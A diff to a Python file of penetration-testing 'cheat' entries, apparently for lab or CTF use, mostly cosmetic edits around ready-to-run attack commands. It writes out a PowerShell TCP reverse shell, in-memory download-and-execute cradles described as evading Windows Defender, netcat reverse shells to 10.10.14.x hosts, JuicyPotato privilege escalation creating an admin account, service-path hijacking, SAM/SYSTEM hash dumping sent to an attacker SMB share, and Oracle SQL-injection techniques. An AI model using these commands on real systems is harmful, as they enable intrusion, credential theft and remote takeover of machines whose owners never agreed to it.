@@ -1,3 +1,5 @@
+# pylint: disable=all
+
 import os
 
 from .cheat import Cheat
@@ -34,7 +36,7 @@ cheat_list = []
 
 PSCredential = create_new_cheat("PSCredential (runas)")
 PSCredential.category = "Windows"
-PSCredential.sub_category = "Powershell"
+PSCredential.sub_category = "PowerShell"
 PSCredential.output = """[*] PSCredential - Create a Credential Object for PowerShell (runas):
 
 # Create Secure password and execute a command with other user
@@ -96,7 +98,7 @@ for line in $(cat icmp.ps1.b64); do cmd="echo ${line} >> C:\Temp\shell.ps1"; cur
 $file = Get-Content -Raw C:\Temp\shell.ps1
 $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
 $decoded > C:\Temp\pwned.ps1
-powershell C:\Temp\pwned.ps1
+powerShell C:\Temp\pwned.ps1
 """
 
 ######################################
@@ -161,7 +163,7 @@ netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localp
 netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow
 
 # Don't know what he do loool. But is importante... need to check...
-net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
+net share attacker_folder=C:\\Windows\Temp /GRANT:Administrators,FULL
 """
 
 ######################################
@@ -231,13 +233,13 @@ file_transfere_windows_iwr.sub_category = "File Transfere"
 file_transfere_windows_iwr.output = """[*] Simple File Transfere for Windows with PowerShell
 
 # simple download
-powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.53:80/nc.exe' -OutFile 'C:\Temp\\nc.exe'"
+powerShell -c "Invoke-WebRequest -Uri 'http://10.10.14.53:80/nc.exe' -OutFile 'C:\Temp\\nc.exe'"
 
 # Donwload and execute directly in RAM (Escape Windows Defender)
-powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')
-start /b C:\Windows\SysNative\WindowsPowerShell\\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"
+powerShell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')
+start /b C:\\Windows\SysNative\WindowsPowerShell\\v1.0\powerShell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"
 
-start /b C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"
+start /b C:\\Windows\SysWOW64\WindowsPowerShell\\v1.0\powerShell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"
 
 # Certutil.exe
 certutil -urlcache -f http://10.10.14.53:80/nc.exe C:\Temp\\nc.exe
@@ -260,7 +262,7 @@ smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support
 # On target machine
 # Connect to SmbServer with credencial for more compatibility and less bugs
 net use \\\\10.10.14.53\smbFolder /u:javali javali
-copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\Windows\Temp\\nc64.exe
+copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\\Windows\Temp\\nc64.exe
 # Execute directely without transfere
 \\\\10.10.14.53\smbFolder\\nc64.exe -e cmd 10.10.14.53 443
 """
@@ -386,7 +388,7 @@ reverseShell_Win.category = "Windows"
 reverseShell_Win.sub_category = "Reverse Shell"
 reverseShell_Win.output = """[*] Simple one liner to get a reverse Shell TCP Windows
 
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 """
 
 ######################################
@@ -595,7 +597,7 @@ crontabs.category = "Linux"
 crontabs.sub_category = "Enumeration"
 crontabs.output = """[*] Crontabs - Basic enumeration Linux
 
-/dev/shm  # comparável ao c:\windows\temp
+/dev/shm  # comparável ao c:\\windows\temp
 crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
@@ -1445,7 +1447,7 @@ juicyPotato = create_new_cheat(
 )
 juicyPotato.category = "Windows"
 juicyPotato.sub_category = "PrivEsc via group"
-juicyPotato.output = """[*] If in life you see SeImpersonatePrivilege, just use JuicyPotato!! =)
+juicyPotato.output = r"""[*] If in life you see SeImpersonatePrivilege, just use JuicyPotato!! =)
 
 # Download JuicyPotato.exe and set a server http
 wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
@@ -1458,19 +1460,19 @@ certutil -urlcache -f http://10.10.14.16/JuicyPotato.exe C:\\Temp\\JuicyPotato.e
 # (Close to always need a password like this!!)
 # Run multiple times while showing OK!
 cd C:\\Temp
-.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user j4vali J4v4li123$! /add"
-.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators j4vali /add"
+.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net user j4vali J4v4li123$! /add"
+.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net localgroup Administrators j4vali /add"
 
 # Add my ip to allow all traffic UDP and TCP
-.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.16 -Direction inbound -Action Allow"
+.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c powerShell New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.16 -Direction inbound -Action Allow"
 
 # Add permission to execute command from out of the local system (cmd)
-.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
 
 # Open Ports (cmd)
-.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow"
-.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow"
-.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
+.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow"
+.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow"
+.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net share attacker_folder=C:\\Windows\\Temp /GRANT:Administrators,FULL"
 
 
 # ------------------------------------------------------------------------
@@ -1554,7 +1556,7 @@ checkenv = create_new_cheat(
     "Check Env if is 64 bits - Is64BitOperatingSystem - Is64BitProcess"
 )
 checkenv.category = "Windows"
-checkenv.sub_category = "Powershell"
+checkenv.sub_category = "PowerShell"
 checkenv.output = """[*] Check Env on windows to make sure the environment is equal to the system
 
 [Environment]::Is64BitOperatingSystem
@@ -1567,11 +1569,11 @@ checkenv.output = """[*] Check Env on windows to make sure the environment is eq
 seclogon = create_new_cheat("sc - Service Control Manager and services")
 seclogon.category = "Windows"
 seclogon.sub_category = "PrivEsc"
-seclogon.output = """[*] if you can modify any service registry, you can modify path to start another program instead
+seclogon.output = r"""[*] if you can modify any service registry, you can modify path to start another program instead
 
 cmd /c sc query seclogon  # If stopped, we can modify path to start another program instead
-reg query 'HKLM\system\currentcontrolset\services\seclogon'  # Get info service
-reg add 'HKLM\system\currentcontrolset\services\seclogon' /t REG_EXPAND_SZ /v ImagePath /d 'C:\Windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.16 4444' /f
+reg query 'HKLM\\system\\currentcontrolset\\services\\seclogon'  # Get info service
+reg add 'HKLM\\system\\currentcontrolset\\services\\seclogon' /t REG_EXPAND_SZ /v ImagePath /d 'C:\\Windows\\system32\\spool\\drivers\\color\nc.exe -e cmd 10.10.14.16 4444' /f
 cmd /c sc start seclogon
 """
 
@@ -1648,15 +1650,15 @@ pypykatz lsa minidump lsass.DMP
 samAndSystem = create_new_cheat("SAM and SYSTEM - Dump hash and system information")
 samAndSystem.category = "Windows"
 samAndSystem.sub_category = "PrivEsc"
-samAndSystem.output = """[*] SAM and SYSTEM - Dump hash and system information
+samAndSystem.output = r"""[*] SAM and SYSTEM - Dump hash and system information
 
 # Get a copy files in use in RAM memory
-reg save HKLM\system system.backup
-reg save HKLM\sam sam.backup
+reg save HKLM\\system system.backup
+reg save HKLM\\sam sam.backup
 
 # Donwload files in kali
-copy system.backup \\10.10.14.16\smbFolder\system.backup
-copy sam.backup \\10.10.14.16\smbFolder\sam.backup
+copy system.backup \\10.10.14.16\\smbFolder\\system.backup
+copy sam.backup \\10.10.14.16\\smbFolder\\sam.backup
 
 # Extract data
 secretsdump.py -sam sam.backup -system system.backup LOCAL
@@ -1924,7 +1926,7 @@ sshpass -p 'Passw0rd!' ssh clave@10.10.10.114
 ######################################
 ######################################
 
-winrmEnable = create_new_cheat("Enable WinRM - Powershell")
+winrmEnable = create_new_cheat("Enable WinRM - PowerShell")
 winrmEnable.category = "Windows"
 winrmEnable.sub_category = "WinRM"
 winrmEnable.output = """[*] Quick default configuration of WinRM
@@ -2259,18 +2261,18 @@ youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=IW
 ######################################
 ######################################
 
-powershell_enc = create_new_cheat("PowerShell exec code in base64, encode and decode")
-powershell_enc.category = "Windows"
-powershell_enc.sub_category = "PowerShell"
-powershell_enc.output = f"""[*] PowerShell execute code in base64 for easy control bad chars on webexploit
+powerShell_enc = create_new_cheat("PowerShell exec code in base64, encode and decode")
+powerShell_enc.category = "Windows"
+powerShell_enc.sub_category = "PowerShell"
+powerShell_enc.output = f"""[*] PowerShell execute code in base64 for easy control bad chars on webexploit
 
 # Create the string for windows in 16bytes little endian
 echo 'IEX(New-Object Net.WebClient).downloadString("http://{ip}/IP.ps1")' | iconv -t utf-16le | base64 -w 0
 
 # Take the output and pass it to web vulnerability to get reverse shell (for example...)
-powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMgAwAC8ASQBQAC4AcABzADEAIgApAAoA
+powerShell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMgAwAC8ASQBQAC4AcABzADEAIgApAAoA
 
-[*] Powershell encode file or binary into base64 for transfere to attacker machine
+[*] PowerShell encode file or binary into base64 for transfere to attacker machine
 [convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))    # or
 [convert]::ToBase64String((cat "your_file_path" -Encoding byte))
 """
@@ -2598,10 +2600,10 @@ requests.get(TARGET_URL)
 ######################################
 ######################################
 
-netstat_powershell = create_new_cheat("netstat - Powershell (adamtheautomator)")
-netstat_powershell.category = "Windows"
-netstat_powershell.sub_category = "Powershell"
-netstat_powershell.output = """[*] netstat - Powershell (adamtheautomator) - Very descritive output
+netstat_powerShell = create_new_cheat("netstat - PowerShell (adamtheautomator)")
+netstat_powerShell.category = "Windows"
+netstat_powerShell.sub_category = "PowerShell"
+netstat_powerShell.output = """[*] netstat - PowerShell (adamtheautomator) - Very descritive output
 
 Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}
 
@@ -2623,13 +2625,13 @@ check_firewall_rules_windows = create_new_cheat(
     "Check Firewall Rule - Windows PowerShell"
 )
 check_firewall_rules_windows.category = "Windows"
-check_firewall_rules_windows.sub_category = "Powershell"
+check_firewall_rules_windows.sub_category = "PowerShell"
 check_firewall_rules_windows.output = """[*] Check Firewall Rule - Windows PowerShell
 
-powershell -c "Get-NetFirewallRule -Direction OutBound -Action Block -Enable True"
-powershell -c "Get-NetFirewallRule -Direction OutBound -Action Allow -Enable True"
+powerShell -c "Get-NetFirewallRule -Direction OutBound -Action Block -Enable True"
+powerShell -c "Get-NetFirewallRule -Direction OutBound -Action Allow -Enable True"
 
-powershell -c "Get-NetFirewallRule -Direction OutBound -Action Block -Enable True | Format-Table -Property Name, DisplayName, DisplayGroup, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort'; Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction"
+powerShell -c "Get-NetFirewallRule -Direction OutBound -Action Block -Enable True | Format-Table -Property Name, DisplayName, DisplayGroup, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort'; Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction"
 
 """
 
@@ -2668,15 +2670,15 @@ SELECT TABLE_NAME FROM USER_TABLES;
 
 # Version
 
-SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
-SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;
+SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
+SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
 SELECT version FROM v$instance;
 
 
 # Comments
 
 SELECT 1 FROM dual — comment
-— NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.
+— NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name 'dual' when we're not actually selecting from a table.
 
 # Current User
 
@@ -2695,13 +2697,13 @@ SELECT name, spare4 FROM sys.user$ — Privilege Required, 11g
 # List Privileges
 
 SELECT * FROM session_privs; — current privilege
-SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — Privilege Required, list a user’s privilege
-SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — Privilege Required, find users with a particular priv
+SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP'; — Privilege Required, list a user's privilege
+SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY'; — Privilege Required, find users with a particular priv
 SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
 
 # List DBA Accounts
 
-SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, list DBAs, DBA roles
+SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES'; — priv, list DBAs, DBA roles
 
 # Current Database
 
@@ -2717,8 +2719,8 @@ SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)
 
 # List Columns
 
-SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
-SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
 
 # List Tables
 
@@ -2727,7 +2729,7 @@ SELECT owner, table_name FROM all_tables;
 
 # Find Tables From Column Name
 
-SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; — NB: table names are upper case
+SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'; — NB: table names are upper case
 
 # Select Nth Row
 
@@ -2736,7 +2738,7 @@ SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username
 
 # Select Nth Char
 
-SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’
+SELECT substr('abcd', 3, 1) FROM dual; — gets 3rd character, 'c'
 
 
 # Bitwise AND
@@ -2751,22 +2753,22 @@ SELECT chr(65) FROM dual; — returns A
 
 # Char -> ASCII Value
 
-SELECT ascii(‘A’) FROM dual; — returns 65
+SELECT ascii('A') FROM dual; — returns 65
 
 
 # Casting
 
 SELECT CAST(1 AS char) FROM dual;
-SELECT CAST(‘1’ AS int) FROM dual;
+SELECT CAST('1' AS int) FROM dual;
 
 # String Concatenation
 
-SELECT ‘A’ || ‘B’ FROM dual; — returns AB
+SELECT 'A' || 'B' FROM dual; — returns AB
 
 
 # If Statement
 
-BEGIN IF 1 = 1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements
+BEGIN IF 1 = 1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn't play well with SELECT statements
 
 
 # Case Statement
@@ -2780,32 +2782,32 @@ SELECT chr(65) || chr(66) FROM dual; — returns AB
 
 # Time Delay
 
-BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT
-SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; — if reverse looks are slow
-SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow
-SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow
+BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can't seem to embed this in a SELECT
+SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; — if reverse looks are slow
+SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; — if forward lookups are slow
+SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; — if outbound TCP is filtered / slow
 — Also see Heavy Queries to create a time delay
 
 # Make DNS Requests
 
-SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
-SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
+SELECT UTL_INADDR.get_host_address('google.com') FROM dual;
+SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual;
 
 # Command Execution
 
-Javacan be used to execute commands if it’s installed.ExtProc can sometimes be used too, though it normally failed for me. 🙁
+Javacan be used to execute commands if it's installed.ExtProc can sometimes be used too, though it normally failed for me. 🙁
 
 # Local File Access
 
 UTL_FILE can sometimes be used.  Check that the following is non-null: 
-SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;Java can be used to read and write files if it’s installed (it is not available in Oracle Express).
+SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir';Java can be used to read and write files if it's installed (it is not available in Oracle Express).
 
 # Hostname, IP Address
 
 SELECT UTL_INADDR.get_host_name FROM dual;
 SELECT host_name FROM v$instance;
 SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address
-SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; — gets hostnames
+SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; — gets hostnames
 
 # Location of DB files
 
@@ -2818,11 +2820,11 @@ SYSAUX
 
 # Get all tablenames in one string
 
-select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,’) from all_tables —  when using union based SQLI with only one row
+select rtrim(xmlagg(xmlelement(e, table_name || ',')).extract('//text()').extract('//text()') ,',') from all_tables —  when using union based SQLI with only one row
 
 # Blind SQLi in order by clause
 
-order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end — you must know 2 column names with the same datatype
+order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = 'a' and rownum = 1)=1) then column_name1 else column_name2 end — you must know 2 column names with the same datatype
 """
 
 
@@ -2980,4 +2982,55 @@ network <network>  # ipv4
 passive-interface <interface>  # ipv4
 
 default-information originate  # ipv4 NEED ip route 0.0.0.0 0.0.0.0 <interface para a internet>
+"""
+
+grepPowerShell = create_new_cheat("grep - PowerShell")
+grepPowerShell.category = "Windows"
+grepPowerShell.sub_category = "PowerShell"
+grepPowerShell.output = """[*] grep - PowerShell
+
+# All output in PowerShell is an object, 
+# so you can convert to string first in multi line 
+# with -Stream param (Out-String -Stream), then use Select-String:
+
+Get-Alias | Out-String -Stream | Select-String -Pattern "ft"
+
+# Fast copy:
+ | Out-String -Stream | Select-String -Pattern ""
+"""
+
+
+disablePylintForAllFile = create_new_cheat("disable pylint for all file")
+disablePylintForAllFile.category = "Python"
+disablePylintForAllFile.sub_category = "general"
+disablePylintForAllFile.output = """[*] disable pylint for all file
+
+# Add this line to the top of the file:
+
+
+# pylint: disable=all
+"""
+
+createNewUserPowerShell = create_new_cheat("Create new user - PowerShell")
+createNewUserPowerShell.category = "Windows"
+createNewUserPowerShell.sub_category = "PowerShell"
+createNewUserPowerShell.output = """[*] Create new user - PowerShell
+
+# Create new user
+New-LocalUser -Name "User1" -Description "Description of User1" -NoPassword
+
+# Add user to group
+Add-LocalGroupMember -Group "Administrators" -Member "User1"
+
+# Remove user from group
+Remove-LocalGroupMember -Group "Administrators" -Member "User1"
+
+# Delete user
+Remove-LocalUser -Name "User1"
+
+# Change password
+Set-LocalUser -Name "User1" -Password (ConvertTo-SecureString -AsPlainText "NewPassword" -Force)
+
+$Password = Read-Host -AsSecureString
+Set-LocalUser -Name "User1" -Password $Password -Description "New description"
 """
